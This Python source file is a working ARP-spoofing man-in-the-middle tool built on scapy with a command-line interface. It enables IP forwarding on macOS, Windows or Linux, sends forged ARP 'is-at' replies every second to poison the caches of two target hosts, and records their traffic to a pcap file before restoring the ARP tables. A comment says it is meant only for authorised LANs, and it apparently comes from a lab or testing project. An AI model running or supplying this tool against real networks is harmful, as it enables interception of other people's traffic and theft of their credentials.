# This code is inspired by (visited at 15.11.2021):
#  https://www.thepythoncode.com/article/building-arp-spoofer-using-scapy
# TODO: Info that this is an offensive script,
#  only use in LAN where you allowed to us such SW

from scapy.all import Ether, ARP, srp, send, sniff, wrpcap
import time
import os
import sys
import subprocess
import platform
import logging
import click
from threading import Thread

from ipaddress import IPv4Address

# TODO: * Get IP addresses of victims in podman setup-
#       * Automatically analyse pcap files within the test
#           * from scapy.utils import RawPcapReader
#           * Pyshark (Python wrapper for tshark)

# TODO (minor):
#       * black, flake8, isort, mypy


# TODO: Make configurable in the future (e.g stream vs file handler)
logger = logging.getLogger("arp-spoofer")
logger.setLevel(logging.DEBUG)

handler = logging.StreamHandler(sys.stdout)
# handler = logging.FileHandler('file.log')
handler.setLevel(logging.DEBUG)
formatter = logging.Formatter(
    '%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
handler.setFormatter(formatter)
logger.addHandler(handler)


def _enable_macos_iproute():
    """
    Enables IP route ( IP Forward ) in MacOS
    :return: Nothing
    """
    # This command needs root rights!
    cmd = "sysctl net.inet.ip.forwarding=1"
    subprocess.Popen(cmd.split(' '))


def _enable_linux_iproute():
    """
    Enables IP route ( IP Forward ) in linux-based distro

    Note: This does not work in containers.
    """
    file_path = "/proc/sys/net/ipv4/ip_forward"
    with open(file_path) as f:
        if f.read() == 1:
            # already enabled
            return
    with open(file_path, "w") as f:
        f.write("1")


def _enable_windows_iproute():
    """
    Enables IP route (IP Forwarding) in Windows
    """
    from services import WService

    # enable Remote Access service
    service = WService("RemoteAccess")
    service.start()


def enable_ip_route():
    """
    Enables IP forwarding
    """
    logger.debug("[*] Getting underlying system...")
    # TODO: Use platform.system() for all platforms.
    platform_name: str = platform.system()
    logger.debug(f"[*] Platform found: {platform_name}")

    if platform_name.lower() == 'darwin':
        logger.info("[*] Enabling IP routing on MacOS...")
        _enable_macos_iproute()
    elif "nt" in os.name:
        logger.info("[*] Enabling IP routing on Windows...")
        _enable_windows_iproute()
    else:
        logger.info("[*] Enabling IP routing on Linux...")
        _enable_linux_iproute()

    logger.info("[+] IP Routing enabled.")


def get_mac(ip: IPv4Address) -> str:
    """
    Returns MAC address belonging to the given IP address within the network.
    Returns None if nothing was found.

    :param ip: IPv4 address as string
    :return:
    """
    logger.debug(f"Getting MAC for IP: {ip}")
    # srp sends ARP request and listens for any response
    ans, _ = srp(
        Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=ip), timeout=3, verbose=0
    )
    if ans:
        mac = ans[0][1].src
        logger.debug(f"Found MAC for IP: {mac}")
        return mac


def spoof(target_ip, host_ip):
    """
    Spoofs target_ip saying that we are host_ip (poisoning the targets cache).

    :param target_ip: IPv4 address as string
    :param host_ip: IPv4 address as string
    :return:
    """
    # get the mac address of the target
    target_mac = get_mac(target_ip)
    logger.debug(f"MAC for target: {target_mac}")

    # Get own mac address
    own_mac = ARP().hwsrc
    logger.debug(f"Our MAC: {own_mac}")

    # Create a 'is-at' operation ARP package (malicious ARP reply).
    # An ARP response we send to the target
    #  saying our mac address belongs to the hosts ip
    arp_response = ARP(
        pdst=target_ip,
        hwdst=target_mac,
        hwsrc=own_mac,
        psrc=host_ip,
        op='is-at',
    )

    # send the packet
    send(arp_response, verbose=0)

    logger.debug(f"[+] Sent to {target_ip} : {host_ip} is-at {own_mac}")


def restore(target_ip, host_ip):
    """
    Restores the normal process of a regular network
    This is done by sending the original information
    (real IP and MAC of `host_ip` ) to `target_ip`

    :param target_ip: IPv4 address as string
    :param host_ip: IPv4 address as string
    :return:
    """
    # get the real MAC address of target
    target_mac = get_mac(target_ip)

    # get the real MAC address of spoofed (gateway, i.e router)
    host_mac = get_mac(host_ip)

    # crafting the restoring packet
    arp_response = ARP(
        pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac
    )

    # sending the restoring packet
    # to restore the network to its normal process
    # we send each reply seven times for a good measure (count=7)
    send(arp_response, verbose=0, count=7)

    logger.info(f"[+] Sent to {target_ip} : {host_ip} is-at {host_mac}")


def capture(file: str, timeout: int) -> None:
    """
    :param file: Filepath for .pcap file
    :param timeout: How long the traffic shall be captured.
    :return:
    """

    """
    Try to use tcpdump directly before using this function here.
    Scapy is not intend/optimized for packet capturing
    """
    if os.path.exists(file):
        click.echo("[+] Delete existing Capture file")
        os.unlink(file)

    click.echo("[+] Start sniffing...")
    pkt = sniff(timeout=timeout)

    click.echo("[+] Stop sniffing")
    wrpcap(file, pkt)


@click.group()
def main_cli():
    pass


@main_cli.command()
@click.argument('target_ip1', type=str)
@click.argument('target_ip2', type=str)
@click.argument('capture_time', type=int)
@click.argument('capture_path', type=str)
@click.argument('is_test', default=False, type=bool)
def run(
    target_ip1: str,
    target_ip2: str,
    capture_time: int,
    capture_path: str,
    is_test: bool = False,
):

    if not is_test:
        # Only execute if the script is NOT executed in a container.
        # enable ip forwarding
        enable_ip_route()

    # Run capturing in different thread since it's blocking
    capture_thread = Thread(target=capture, args=(capture_path, capture_time))
    capture_thread.start()

    # Send malicious packages every second
    try:
        while capture_thread.is_alive():
            # telling the target1 that we are the target2
            spoof(target_ip1, target_ip2)
            # telling the target2 that we are the target1
            spoof(target_ip2, target_ip1)

            # sleep for one second
            time.sleep(1)
    except KeyboardInterrupt:
        # Restore even the user terminates the process
        pass
    finally:
        # Restore the network to the legit state
        restore(target_ip1, target_ip2)
        restore(target_ip2, target_ip1)

        # TODO: Force it to quit? With timeout?
        #  Keep it as it is? Before or after restore?
        # Wait for the sniffing to be completed
        capture_thread.join()


if __name__ == '__main__':
    main_cli()
